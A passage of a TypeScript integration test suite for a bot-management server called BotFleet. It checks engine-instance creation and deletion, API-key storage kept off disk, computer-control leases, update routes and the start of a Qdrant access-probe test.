    // The second engine that can carry more than one instance. Everything
    // the openai-compat path already proves has to hold here too — the key
    // never lands in the persisted `environment`, the encrypted-store PATCH
    // keeps it off disk entirely — and the driver choice itself has to be
    // validated, or POST /api/instances becomes a way to mint a second
    // instance of an engine that cannot arbitrate one.
    expect((await api("POST", "/api/instances", {
      name: "Not A Driver",
      endpoint: "http://127.0.0.1:11497/v1",
      driver: "definitely-not-a-driver",
      key: "sk-refused",
    })).status).toBe(400);
    // boxAgent declares supportsMultipleInstances: false.
    expect((await api("POST", "/api/instances", {
      name: "Second Computer",
      endpoint: "http://127.0.0.1:11497/v1",
      driver: "boxAgent",
      key: "sk-refused",
    })).status).toBe(400);
    // These three DO declare supportsMultipleInstances, and every one of them
    // would be handed a workspace credential it reads from process.env or a
    // CLI login in the user's home directory. A second instance pointed at an
    // endpoint typed into this route would receive it, so the gate is
    // `supportsMultipleInstances` AND `install.apiKeyOnly`.
    for (const driver of ["grok", "piAgent", "antigravityAgent", "claudeAgent", "codex"]) {
      const refused = await api("POST", "/api/instances", {
        name: `Second ${driver}`,
        endpoint: "http://127.0.0.1:11497/v1",
        driver,
        key: "sk-refused",
      });
      expect(refused.status, driver).toBe(400);
      expect(refused.body.error, driver).toContain("can only be configured once");
    }
    // A paid hosted API still needs a key of its own: no workspace credential
    // will ever reach a non-reserved instance, so a keyless one could do
    // nothing but fail every turn.
    const keyless = await api("POST", "/api/instances", {
      name: "Keyless MiniMax",
      endpoint: "http://127.0.0.1:11497/v1",
      driver: "minimax",
    });
    expect(keyless.status).toBe(400);
    expect(keyless.body.error).toContain("API key is required");
    // A custom icon reaches the engine rail only through the live instance's
    // own `iconUrl`, which a driver has to read out of its config and expose.
    // MiniMax's config schema has exactly one field, so an icon accepted here
    // would be configuration that silently does nothing.
    const iconed = await api("POST", "/api/instances", {
      name: "Iconed MiniMax",
      endpoint: "http://127.0.0.1:11497/v1",
      driver: "minimax",
      key: "sk-refused",
      iconUrl: "https://example.test/icon.svg",
    });
    expect(iconed.status).toBe(400);
    expect(iconed.body.error).toContain("does not support a custom icon");
    // …unless the desktop shell is about to commit one to its encrypted
    // store, which is the one keyless create that is not a broken engine.
    const declared = await api("POST", "/api/instances?secretStorage=external", {
      name: "Declared MiniMax",
      endpoint: "http://127.0.0.1:11497/v1",
      driver: "minimax",
    });
    expect(declared.status).toBe(201);
    expect((await api("DELETE", `/api/instances/${declared.body.instanceId}`)).status).toBe(200);
    // openai-compat is the exception: an endpoint needing no auth at all —
    // Ollama, LM Studio, vLLM — is a first-class use, and safe because the
    // driver refuses the workspace key for a non-reserved instance.
    const anonymous = await api("POST", "/api/instances", {
      name: "Anonymous Local",
      endpoint: "http://127.0.0.1:11494/v1",
      models: ["local-model"],
    });
    expect(anonymous.status).toBe(201);
    expect(
      JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"))
        .instances[anonymous.body.instanceId].config.credentialStorage,
    ).toBeUndefined();
    expect((await api("DELETE", `/api/instances/${anonymous.body.instanceId}`)).status).toBe(200);

    const created = await api("POST", "/api/instances", {
      name: "MiniMax China",
      endpoint: "http://127.0.0.1:11497/v1",
      driver: "minimax",
      key: "sk-minimax-second-instance",
    });
    expect(created.status).toBe(201);
    const instanceId = created.body.instanceId;
    expect(instanceId).toContain("custom-minimax-china");
    try {
      const found = (await api("GET", "/api/instances")).body.instances
        .find((i: any) => i.instanceId === instanceId);
      expect(found).toBeDefined();
      expect(found.driverKind).toBe("minimax");
      expect(found.displayName).toBe("MiniMax China");
      // The reserved `minimax` instance is not custom; this one is, which is
      // what puts a Delete button on its row.
      expect(found.isCustom).toBe(true);
      expect((await api("GET", "/api/instances")).body.instances
        .find((i: any) => i.instanceId === "minimax").isCustom).toBe(false);
      // MiniMax ships its own catalog — a second connection offers the same
      // models without anybody retyping them.
      expect(found.models.options.length).toBeGreaterThan(0);

      const onDisk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      const entry = (onDisk.instances ?? {})[instanceId];
      expect(entry.driver).toBe("minimax");
      expect(entry.config.url).toBe("http://127.0.0.1:11497/v1");
      // Dev/browser fallback shape, exactly as openai-compat stores it.
      expect(entry.config.key).toBe("sk-minimax-second-instance");
      // …and never a second copy in the persisted environment: that copy is
      // injected for the live driver and stripped again on the way to disk,
      // so a rotated key can never leave a stale one behind.
      expect(entry.environment?.MINIMAX_API_KEY).toBeUndefined();
      for (const persisted of Object.values<any>(onDisk.instances ?? {})) {
        expect(JSON.stringify(persisted?.environment ?? {})).not.toContain("sk-minimax-second-instance");
      }

      // Rotating it leaves exactly one copy behind, in config.
      expect((await api("PATCH", `/api/instances/${instanceId}`, { key: "sk-minimax-rotated" })).status).toBe(200);
      const rotated = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(JSON.stringify(rotated.instances ?? {})).not.toContain("sk-minimax-second-instance");
      expect((rotated.instances ?? {})[instanceId].config.key).toBe("sk-minimax-rotated");
      expect((rotated.instances ?? {})[instanceId].environment?.MINIMAX_API_KEY).toBeUndefined();

      // A bot can be pointed at it by instance id like any other engine.
      const bot = (await api("POST", "/api/bots", {
        name: "China Bot",
        modelSelection: { instanceId, model: "MiniMax-M3" },
      })).body.bot;
      try {
        expect(bot.modelSelection.instanceId).toBe(instanceId);
      } finally {
        await api("DELETE", `/api/bots/${bot.id}`);
      }
    } finally {
      expect((await api("DELETE", `/api/instances/${instanceId}`)).status).toBe(200);
    }
    expect((await api("GET", "/api/instances")).body.instances
      .find((i: any) => i.instanceId === instanceId)).toBeUndefined();
    // The default connection is still protected from deletion.
    expect((await api("DELETE", "/api/instances/minimax")).status).toBe(400);
  }, 60_000);

  it("reports the two API-key engines' state and endpoint on /api/config, and saves them", async () => {
    // Before this, `configStatus()` hand-listed every section and had no
    // entry for either engine that is configured with an endpoint and a key
    // instead of a CLI login — so the API Keys panel had no way to show
    // whether a key was saved, and no way to save one.
    const boot = (await api("GET", "/api/config")).body;
    expect(boot.minimax).toEqual({ configured: false, url: "", pending: false });
    expect(boot.openaiCompat).toEqual({ configured: false, url: "", pending: false });

    try {
      const saved = await api("PUT", "/api/config", {
        minimax: { key: "sentinel-workspace-minimax-key", url: "https://api.minimaxi.com/v1" },
      });
      expect(saved.status).toBe(200);
      const after = (await api("GET", "/api/config")).body;
      // The key is reported as a boolean and never echoed; the endpoint is
      // configuration, so it comes back in full.
      expect(after.minimax).toEqual({ configured: true, url: "https://api.minimaxi.com/v1", pending: false });
      expect(JSON.stringify(after)).not.toContain("sentinel-workspace-minimax-key");

      // …and it reaches the reserved instance, which is the whole point.
      const onDisk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(onDisk.minimax.url).toBe("https://api.minimaxi.com/v1");
      expect(onDisk.minimax.key).toBe("sentinel-workspace-minimax-key");
      // Never copied into any instance's persisted environment.
      for (const entry of Object.values<any>(onDisk.instances ?? {})) {
        expect(JSON.stringify(entry?.environment ?? {})).not.toContain("sentinel-workspace-minimax-key");
      }

      // The desktop path: the key goes to the encrypted store, and this
      // route persists only the tombstone plus the durable marker.
      const external = await api("PUT", "/api/config?secretStorage=external", {
        minimax: { key: "sentinel-encrypted-minimax-key" },
      });
      expect(external.status).toBe(200);
      const externalDisk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(JSON.stringify(externalDisk.minimax)).not.toContain("sentinel-encrypted-minimax-key");
      expect(externalDisk.minimax.credentialStorage).toBe("external");
      expect(externalDisk.minimax.key).toBe("");
      // The endpoint saved a moment ago survives the credential-only save.
      expect(externalDisk.minimax.url).toBe("https://api.minimaxi.com/v1");
      // The key stays LIVE in this process — the desktop shell committed it
      // to the encrypted store and `syncCredentialEnv` keeps the running
      // harness in step, exactly as it does for every other credential on
      // this path. The tombstone and the marker just asserted are what make
      // `pending` true on the NEXT launch, before the shell replays the
      // store; `engineKeyStatus` in src/lib/engine-key-config.test.ts covers
      // how the panel renders that state.
      expect((await api("GET", "/api/config")).body.minimax).toEqual({
        configured: true,
        url: "https://api.minimaxi.com/v1",
        pending: false,
      });

      // Clearing drops the marker, so an anonymous endpoint stays valid.
      expect((await api("PUT", "/api/config?secretStorage=external", { minimax: { key: "" } })).status).toBe(200);
      const cleared = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(cleared.minimax.credentialStorage).toBeUndefined();
      expect((await api("GET", "/api/config")).body.minimax.pending).toBe(false);

      // `credentialStorage` is the store's to write, never the caller's.
      expect((await api("PUT", "/api/config", {
        minimax: { credentialStorage: "external" },
      })).status).toBe(400);
    } finally {
      await api("PUT", "/api/config", { minimax: { key: "", url: "" } });
    }
    expect((await api("GET", "/api/config")).body.minimax).toEqual({
      configured: false,
      url: "",
      pending: false,
    });
  }, 30_000);

  it("routes a MiniMax connection's key through the same encrypted store openai-compat uses", async () => {
    // The desktop shell creates the instance without a key (the bridge holds
    // it) and then PATCHes ?secretStorage=external. Nothing about that path
    // was openai-compat-specific except the driver check it used to make.
    const created = await api("POST", "/api/instances?secretStorage=external", {
      name: "MiniMax Gateway",
      endpoint: "http://127.0.0.1:11496/v1",
      driver: "minimax",
    });
    expect(created.status).toBe(201);
    // Marked at CREATE time, not by the follow-up PATCH: otherwise there is a
    // window in which the instance exists keyless AND unmarked, which is the
    // one state that reads as an intentionally anonymous engine.
    expect(
      JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"))
        .instances[created.body.instanceId].config.credentialStorage,
    ).toBe("external");
    const instanceId = created.body.instanceId;
    try {
      expect((await api("PATCH", `/api/instances/${instanceId}?secretStorage=external`, {
        key: "sk-minimax-never-touches-disk",
      })).status).toBe(200);

      const onDisk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      const entry = (onDisk.instances ?? {})[instanceId];
      expect(JSON.stringify(entry)).not.toContain("sk-minimax-never-touches-disk");
      expect(entry.config.credentialStorage).toBe("external");
      expect(entry.config.key).toBeUndefined();
      expect(entry.environment?.MINIMAX_API_KEY).toBeUndefined();

      // An unrelated PATCH must not drop the live-only override.
      expect((await api("PATCH", `/api/instances/${instanceId}`, { fullAuto: false })).status).toBe(200);
      const after = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect(JSON.stringify((after.instances ?? {})[instanceId])).not.toContain("sk-minimax-never-touches-disk");
      expect((after.instances ?? {})[instanceId].config.credentialStorage).toBe("external");

      expect((await api("PATCH", `/api/instances/${instanceId}?secretStorage=external`, { key: "" })).status).toBe(200);
      const cleared = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
      expect((cleared.instances ?? {})[instanceId].config.credentialStorage).toBeUndefined();
    } finally {
      expect((await api("DELETE", `/api/instances/${instanceId}`)).status).toBe(200);
    }
  }, 30_000);

  it("keeps a custom engine's live-only encrypted key across an unrelated global provider reload", async () => {
    // PATCH /api/instances/:id?secretStorage=external sets an in-memory-only
    // instanceKeyOverrides entry, applied by that one route to the live
    // registry entry it just reloaded. reloadProviders() — triggered by ANY
    // unrelated settings change (a different provider's own credential, bot
    // defaults, …) — rebuilds the WHOLE fleet from instanceConfigs(cfg)
    // alone; without withInstanceKeyOverrides() this silently dropped every
    // encrypted custom-engine key until the app restarted and Electron
    // replayed it. Prove it end-to-end: a real turn against a real fixture
    // endpoint, sent only after a real global reload, still carries the key.
    let capturedAuthorization: string | null | undefined;
    const fixture = createServer((req, res) => {
      if (req.method === "POST" && req.url?.includes("/chat/completions")) {
        capturedAuthorization = req.headers.authorization ?? null;
        res.writeHead(200, { "content-type": "text/event-stream" });
        res.end('data: {"choices":[{"delta":{"content":"ok"}}]}\n' + "data: [DONE]\n");
        return;
      }
      res.writeHead(404);
      res.end();
    });
    await new Promise<void>((resolve) => fixture.listen(0, "127.0.0.1", resolve));
    const port = (fixture.address() as { port: number }).port;

    const created = await api("POST", "/api/instances", {
      name: "Reload Survives Engine",
      endpoint: `http://127.0.0.1:${port}/v1`,
      models: ["reload-test-model"],
    });
    expect(created.status).toBe(201);
    const instanceId = created.body.instanceId;

    try {
      const patched = await api("PATCH", `/api/instances/${instanceId}?secretStorage=external`, {
        key: "sk-reload-survives",
      });
      expect(patched.status).toBe(200);

      // An unrelated provider credential is a documented reloadProviders()
      // trigger (PUT /api/config's own reloadKeys check) — "xai" is not in
      // that route's no-reload exclusion list (profile/tts/imageGen/vps/…).
      const unrelatedSave = await api("PUT", "/api/config", { xai: { key: "unrelated-xai-key-for-reload-trigger" } });
      expect(unrelatedSave.status).toBe(200);

      const botRes = await api("POST", "/api/bots", {
        name: "Reload Survives Bot",
        modelSelection: { instanceId, model: "reload-test-model" },
      });
      expect(botRes.status).toBe(201);
      const botId = botRes.body.bot.id;
      try {
        const sent = await api("POST", `/api/bots/${botId}/messages`, { text: "does the key survive?" });
        expect(sent.status).toBe(202);

        await expect
          .poll(async () => {
            const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
              (candidate: { id: string }) => candidate.id === botId,
            );
            return state?.busy;
          }, { timeout: 10_000 })
          .toBe(false);

        expect(capturedAuthorization).toBe("Bearer sk-reload-survives");
      } finally {
        await api("DELETE", `/api/bots/${botId}`);
      }
    } finally {
      await api("PUT", "/api/config", { xai: { key: "" } });
      await api("DELETE", `/api/instances/${instanceId}`);
      await new Promise<void>((resolve) => fixture.close(() => resolve()));
    }
  }, 30_000);

  it("does not interrupt an unrelated busy bot when adding a new custom engine", async () => {
    // Adding an independent engine used to call the global reloadProviders(),
    // which disposes EVERY provider and settles every busy bot as
    // interrupted — even bots that never touch the new engine.
    const instances = (await api("GET", "/api/instances")).body.instances;
    const claude = instances.find((i: any) => i.instanceId === "claude");
    const bot = (await api("POST", "/api/bots", { name: "Busy During Add", computers: [] })).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "claude", model: claude.models.default },
        computers: [],
      })).status).toBe(200);
      // the fixture CLI hangs, so this turn stays live until it is stopped
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "hang forever" })).status).toBe(202);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(true);

      const created = await api("POST", "/api/instances", {
        name: "Unrelated Engine",
        endpoint: "http://localhost:11494/v1",
        models: ["unrelated-model"],
      });
      expect(created.status).toBe(201);
      const newInstanceId = created.body.instanceId;
      try {
        // give any (incorrect) global teardown a moment to have taken effect
        await new Promise((resolve) => setTimeout(resolve, 250));
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        expect(state?.busy).toBe(true);
      } finally {
        await api("DELETE", `/api/instances/${newInstanceId}`);
      }
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  }, 60_000);

  it("excludes the deleted engine from replacement selection, picking a real other engine instead of itself", async () => {
    // Disable every other fixture engine and add a SECOND custom engine
    // besides the one being deleted, so a real (non-empty) replacement
    // exists — the exact condition that exposed the original bug:
    // defaultSelection() still sees the instance being deleted in the live
    // registry (deletion hasn't happened yet) and would hand back the
    // about-to-be-deleted instance's own id as "the replacement", leaving
    // the bot's next turn pointed at nothing.
    const toDisable = ["claude", "claude2", "crasher"];
    for (const id of toDisable) {
      expect((await api("PATCH", `/api/instances/${id}`, { enabled: false })).status).toBe(200);
    }
    let backupId = "";
    try {
      const backup = await api("POST", "/api/instances", {
        name: "Backup Engine",
        endpoint: "http://localhost:11496/v1",
        models: ["backup-model"],
      });
      expect(backup.status).toBe(201);
      backupId = backup.body.instanceId;

      const created = await api("POST", "/api/instances", {
        name: "Solo Engine",
        endpoint: "http://localhost:11493/v1",
        models: ["solo-model"],
      });
      expect(created.status).toBe(201);
      const instanceId = created.body.instanceId;

      const botRes = await api("POST", "/api/bots", {
        name: "Solo Bot",
        modelSelection: { instanceId, model: "solo-model" },
      });
      expect(botRes.status).toBe(201);
      const soloBotId = botRes.body.bot.id;

      const deleted = await api("DELETE", `/api/instances/${instanceId}`);
      expect(deleted.status).toBe(200);

      const botsAfter = await api("GET", "/api/bots");
      const foundBot = botsAfter.body.bots.find((b: any) => b.id === soloBotId);
      expect(foundBot).toBeDefined();
      // A real replacement — not itself, and not the empty string
      // defaultSelection() honestly reports when nothing else is available
      // (see "refuses to delete an engine when no replacement is available"
      // below for that case).
      expect(foundBot.modelSelection.instanceId).not.toBe(instanceId);
      expect(foundBot.modelSelection.instanceId).not.toBe("");

      await api("DELETE", `/api/bots/${soloBotId}`);
    } finally {
      if (backupId) await api("DELETE", `/api/instances/${backupId}`);
      for (const id of toDisable) {
        expect((await api("PATCH", `/api/instances/${id}`, { enabled: true })).status).toBe(200);
      }
      const restored = await api("GET", "/api/instances?fresh=1");
      for (const id of toDisable) {
        const row = restored.body.instances.find((i: any) => i.instanceId === id);
        expect(row?.enabled).toBe(true);
      }
    }
  }, 60_000);

  it("refuses to delete an engine when no other engine is available to reassign its bots", async () => {
    // With every other fixture engine disabled, the about-to-be-deleted
    // custom engine is the ONLY available instance, so excluding it from
    // the replacement pool leaves defaultSelection() with nothing —
    // deliberately an empty {instanceId:"", model:""}, the honest answer
    // for a bot being freshly created. Silently writing that into an
    // EXISTING bot used to leave it referencing instanceId "", failing
    // every future turn with no way back short of manual reconfiguration.
    // Deletion must be refused instead, the same way a busy affected bot
    // already is.
    const instancesRes = await api("GET", "/api/instances");
    const toDisable = (instancesRes.body.instances as Array<{ instanceId: string; enabled: boolean }>)
      .filter((i) => i.enabled)
      .map((i) => i.instanceId);
    for (const id of toDisable) {
      expect((await api("PATCH", `/api/instances/${id}`, { enabled: false })).status).toBe(200);
    }
    try {
      const created = await api("POST", "/api/instances", {
        name: "Only Engine",
        endpoint: "http://localhost:11497/v1",
        models: ["only-model"],
      });
      expect(created.status).toBe(201);
      const instanceId = created.body.instanceId;

      const botRes = await api("POST", "/api/bots", {
        name: "Only Bot",
        modelSelection: { instanceId, model: "only-model" },
      });
      expect(botRes.status).toBe(201);
      const onlyBotId = botRes.body.bot.id;

      try {
        const deleted = await api("DELETE", `/api/instances/${instanceId}`);
        expect(deleted.status).toBe(409);
        expect(deleted.body.error).toMatch(/no other configured engine is available/);

        // Nothing changed: the bot still references the engine, and the
        // engine itself is still there.
        const botsAfter = await api("GET", "/api/bots");
        const foundBot = botsAfter.body.bots.find((b: any) => b.id === onlyBotId);
        expect(foundBot?.modelSelection.instanceId).toBe(instanceId);
        const instancesAfter = await api("GET", "/api/instances");
        expect(instancesAfter.body.instances.some((i: any) => i.instanceId === instanceId)).toBe(true);
      } finally {
        await api("DELETE", `/api/bots/${onlyBotId}`);
        await api("DELETE", `/api/instances/${instanceId}`);
      }
    } finally {
      for (const id of toDisable) {
        expect((await api("PATCH", `/api/instances/${id}`, { enabled: true })).status).toBe(200);
      }
      const restored = await api("GET", "/api/instances?fresh=1");
      for (const id of toDisable) {
        const row = restored.body.instances.find((i: any) => i.instanceId === id);
        expect(row?.enabled).toBe(true);
      }
    }
  }, 60_000);

  it("does not interrupt an unrelated busy bot when deleting an unused custom engine", async () => {
    // Deleting a custom engine used to call the global reloadProviders(),
    // which disposes EVERY provider and settles every busy bot as
    // interrupted — even one on `claude` that never referenced the engine
    // being deleted. The affectedBots guard already permits this deletion
    // (the busy bot doesn't reference it); only the deleted instance's own
    // registry entry and bus attachment may go away.
    const instances = (await api("GET", "/api/instances")).body.instances;
    const claude = instances.find((i: any) => i.instanceId === "claude");
    const created = await api("POST", "/api/instances", {
      name: "Unrelated Delete Engine",
      endpoint: "http://localhost:11491/v1",
      models: ["unrelated-delete-model"],
    });
    expect(created.status).toBe(201);
    const newInstanceId = created.body.instanceId;

    const bot = (await api("POST", "/api/bots", { name: "Busy During Delete", computers: [] })).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        modelSelection: { instanceId: "claude", model: claude.models.default },
        computers: [],
      })).status).toBe(200);
      // the fixture CLI hangs, so this turn stays live until it is stopped
      expect((await api("POST", `/api/bots/${bot.id}/messages`, { text: "hang forever" })).status).toBe(202);
      await expect.poll(async () => {
        const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
          (candidate: { id: string }) => candidate.id === bot.id,
        );
        return state?.busy;
      }).toBe(true);

      const deleted = await api("DELETE", `/api/instances/${newInstanceId}`);
      expect(deleted.status).toBe(200);

      const state = (await api("GET", "/api/bots?messages=0")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(state?.busy).toBe(true);

      const instancesAfter = (await api("GET", "/api/instances")).body.instances;
      expect(instancesAfter.some((i: any) => i.instanceId === newInstanceId)).toBe(false);
    } finally {
      await api("POST", `/api/bots/${bot.id}/interrupt`, {});
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  }, 30_000);

  it("rewrites a task-level model override that references a deleted engine, not just the bot's own selection", async () => {
    // A bot can use a deleted engine through a task-level modelSelection
    // override while its own top-level modelSelection points elsewhere —
    // sendBotTurn prioritizes the task override, so a stale one surviving
    // deletion would still fail on the next turn even though the bot
    // "looks" reassigned.
    const instances = (await api("GET", "/api/instances")).body.instances;
    const claude = instances.find((i: any) => i.instanceId === "claude");

    const created = await api("POST", "/api/instances", {
      name: "Task Override Engine",
      endpoint: "http://localhost:11492/v1",
      models: ["task-model"],
    });
    expect(created.status).toBe(201);
    const instanceId = created.body.instanceId;

    const botRes = await api("POST", "/api/bots", {
      name: "Task Override Bot",
      modelSelection: { instanceId: "claude", model: claude.models.default },
      computers: [],
    });
    expect(botRes.status).toBe(201);
    const botId = botRes.body.bot.id;

    try {
      const taskRes = await api("POST", `/api/bots/${botId}/tasks`, { title: "Side task" });
      expect(taskRes.status).toBe(201);
      const threadId = taskRes.body.task.threadId;

      const setSelection = await api("PATCH", `/api/bots/${botId}/tasks/${threadId}`, {
        modelSelection: { instanceId, model: "task-model" },
      });
      expect(setSelection.status).toBe(200);
      expect(setSelection.body.task.modelSelection.instanceId).toBe(instanceId);

      const deleted = await api("DELETE", `/api/instances/${instanceId}`);
      expect(deleted.status).toBe(200);

      const after = await api("GET", "/api/bots");
      const freshBot = after.body.bots.find((b: any) => b.id === botId);
      expect(freshBot).toBeDefined();
      // the bot's own selection never referenced the deleted engine
      expect(freshBot.modelSelection.instanceId).toBe("claude");
      // but the task-level override must no longer reference it either
      const freshTask = freshBot.tasks.find((t: any) => t.threadId === threadId);
      expect(freshTask).toBeDefined();
      expect(freshTask.modelSelection?.instanceId).not.toBe(instanceId);
    } finally {
      await api("DELETE", `/api/bots/${botId}`);
    }
  }, 30_000);
});

describe("computer control API (who is driving)", () => {
  let botId = "";

  beforeAll(async () => {
    const created = await api("POST", "/api/bots", {});
    botId = created.body.bot.id;
  });

  it("starts disengaged", async () => {
    const res = await api("GET", `/api/bots/${botId}/computer/control`);
    expect(res.status).toBe(200);
    expect(res.body).toEqual({ held: false, helpReason: null, heldSinceMs: null });
  });

  it("take → held, broadcast on the wire, release → disengaged", async () => {
    const sse = await openSse(`${BASE}/api/events`);
    try {
      const took = await api("POST", `/api/bots/${botId}/computer/control`, { action: "take" });
      expect(took.status).toBe(200);
      expect(took.body.held).toBe(true);
      const frame = await sse.until(
        (f) => f.kind === "computer-control" && f.botId === botId && f.held === true,
      );
      expect(frame.helpReason).toBeNull();
      const hydrated = await api("GET", "/api/bots");
      expect(hydrated.body.computerControl[botId]).toEqual({ held: true, helpReason: null });
      const released = await api("POST", `/api/bots/${botId}/computer/control`, { action: "release" });
      expect(released.body.held).toBe(false);
    } finally {
      sse.close();
    }
  });

  it("atomically owns and conditionally releases a workspace lease without returning its id", async () => {
    const owner = "lease_5b6bbbd2-b88b-4c50-a748-ec87f332662f";
    const other = "lease_ed602995-306f-480a-8817-e8d8c8fe7d90";
    const took = await api("POST", `/api/bots/${botId}/computer/control`, {
      action: "take",
      controlLeaseId: owner,
    });
    expect(took.body).toMatchObject({ held: true, owned: true, acquired: true });
    expect(JSON.stringify(took.body)).not.toContain(owner);

    const blocked = await api("POST", `/api/bots/${botId}/computer/control`, {
      action: "take",
      controlLeaseId: other,
    });
    expect(blocked.body).toMatchObject({ held: true, owned: false, acquired: false });

    const wrongRelease = await api("POST", `/api/bots/${botId}/computer/control`, {
      action: "release",
      controlLeaseId: other,
    });
    expect(wrongRelease.body).toMatchObject({ held: true, released: false });

    const released = await api("POST", `/api/bots/${botId}/computer/control`, {
      action: "release",
      controlLeaseId: owner,
    });
    expect(released.body).toMatchObject({ held: false, released: true });
    expect(JSON.stringify(released.body)).not.toContain(owner);
  });

  it("rejects malformed workspace leases without echoing them", async () => {
    const invalid = "bad lease value";
    const res = await api("POST", `/api/bots/${botId}/computer/control`, {
      action: "take",
      controlLeaseId: invalid,
    });
    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).not.toContain(invalid);
  });

  it("refuses an unknown action and an unknown bot", async () => {
    const bad = await api("POST", `/api/bots/${botId}/computer/control`, { action: "hijack" });
    expect(bad.status).toBe(400);
    const ghost = await api("GET", "/api/bots/nope/computer/control");
    expect(ghost.status).toBe(404);
  });

  it("refuses a form-shaped POST — control mutations are JSON-only", async () => {
    const res = await fetch(`${BASE}/api/bots/${botId}/computer/control`, {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: "action=take",
    });
    expect(res.status).toBe(415);
  });

  it("keeps the internal who-is-driving endpoint behind the boot token", async () => {
    const res = await fetch(`${BASE}/api/internal/computer-control?botId=${botId}`);
    expect(res.status).toBe(401);
  });
});

describe("GET /api/quotas", () => {
  it("returns active quota cooldowns, without pretending an engine is capped at boot", async () => {
    const res = await fetch(`${BASE}/api/quotas`);
    expect(res.status).toBe(200);
    const data = (await res.json()) as { ok: boolean; cooldowns: Array<{ instanceId: string; error: string }> };
    expect(data.ok).toBe(true);
    expect(Array.isArray(data.cooldowns)).toBe(true);
    expect(data.cooldowns.find((c) => c.instanceId === "codex")).toBeUndefined();
  });
});

describe("the update routes and the admission they hold", () => {
  // Every mutating API request takes an update admission for the length of
  // its handler, and runtime readiness counts admissions as work in flight.
  // A route that then built its answer from the harness-wide reading reported
  // the machine busy because of the question: `capabilities.canRun` came back
  // false with the busy refusal on a completely idle Mac, and both clients
  // hide **Install Update** on `canRun` — so the response that had just found
  // the update was also the one that took the button away.
  //
  // `GET /api/update/status` holds no admission, so it is the honest reading,
  // and the invariant is that the two POSTs agree with it.  That holds on any
  // OS (`canRun` is false off macOS anyway, and on a CI Mac whose HOME has no
  // always-on checkout) and whatever else this suite has left running — but
  // it is only SHARP while nothing else is in flight, so the busy sentence is
  // asserted only when the unadmitted reading says the machine is free.  The
  // deterministic version of this is in server/update-control.test.ts.
  const BUSY = "BotFleet is working right now.";
  type Capabilities = { canCheck: boolean; canRun: boolean; reasons: string[] };
  const looksBusy = (capabilities: Capabilities) =>
    capabilities.reasons.some((reason) => reason.startsWith(BUSY));
  const unadmitted = async (): Promise<Capabilities> => {
    const res = await api("GET", "/api/update/status");
    expect(res.status).toBe(200);
    return res.body.capabilities as Capabilities;
  };

  it("does not count its own admission when POST /api/update/check answers", async () => {
    const before = await unadmitted();
    const checked = await api("POST", "/api/update/check");
    const after = await unadmitted();
    expect([200, 502]).toContain(checked.status);
    const status = checked.status === 200 ? checked.body : checked.body.status;
    expect(status).toMatchObject({ installed: { version: expect.any(String) } });
    // Either unadmitted reading will do: the suite may finish a turn between
    // the three calls, and that is a real change, not this request's doing.
    expect([before, after]).toContainEqual(status.capabilities);
    if (!looksBusy(before) && !looksBusy(after)) {
      expect(looksBusy(status.capabilities)).toBe(false);
    }
  });

  it("does not count its own admission when POST /api/update/run refuses", async () => {
    const before = await unadmitted();
    const refused = await api("POST", "/api/update/run", {});
    const after = await unadmitted();
    // Nothing to install on a throwaway home, so this is always a refusal.
    expect(refused.status).toBe(409);
    expect([before, after]).toContainEqual(refused.body.status.capabilities);
    if (!looksBusy(before) && !looksBusy(after)) {
      // A refusal for some other reason must not also say the Mac is busy:
      // the client stores the status that came with it.
      expect(refused.body.error).not.toContain(BUSY);
      expect(looksBusy(refused.body.status.capabilities)).toBe(false);
    }
  });
});

describe("GET /api/qdrant/status (Agent RAG connection)", () => {
  const setRecallMode = (mode: "ok" | "slow" | "fail") =>
    writeFileSync(join(home, ".botfleet", "fake-recall-mode"), mode);

  /** Point the probe at a stub and hand back a cleanup that clears it. */
  const configureRecall = async (patch: Record<string, string>) => {
    const saved = await api("PATCH", "/api/config", { qdrant: patch });
    expect(saved.status).toBe(200);
    return async () => {
      await api("PATCH", "/api/config", {
        qdrant: { url: "", apiKey: "", collection: "", accessClientId: "", accessClientSecret: "" },
      });
    };
  };

  /** A stub recall service that only answers callers carrying a Cloudflare
   * Access service token, and otherwise redirects to a login page — exactly
   * what a host published behind Access does.  The redirect target carries
   * Access's own path marker (/cdn-cgi/access/login/...) on the SAME origin
   * as the stub rather than a real cloudflareaccess.com host: that marker is
   * what a genuine Access gateway always sends regardless of which host
   * answers it, so the probe's real "follow, then recognise" path gets
   * exercised without this test depending on live DNS/network access. */
  const startGatedRecall = async (token: { id: string; secret: string } | null) => {
    // Node models a header as string | string[]; every one read here is
    // single-valued, so the first value is the value.
    const headerValue = (raw: string | string[] | undefined): string | undefined =>
      Array.isArray(raw) ? raw[0] : raw;
    const seen: Array<{ path: string; accessId?: string; hasAccessSecret: boolean; authorization?: string }> = [];
    const server = createServer((req, res) => {
      const accessId = headerValue(req.headers["cf-access-client-id"]);
      const accessSecret = headerValue(req.headers["cf-access-client-secret"]);
      seen.push({
        path: req.url ?? "",
        accessId,
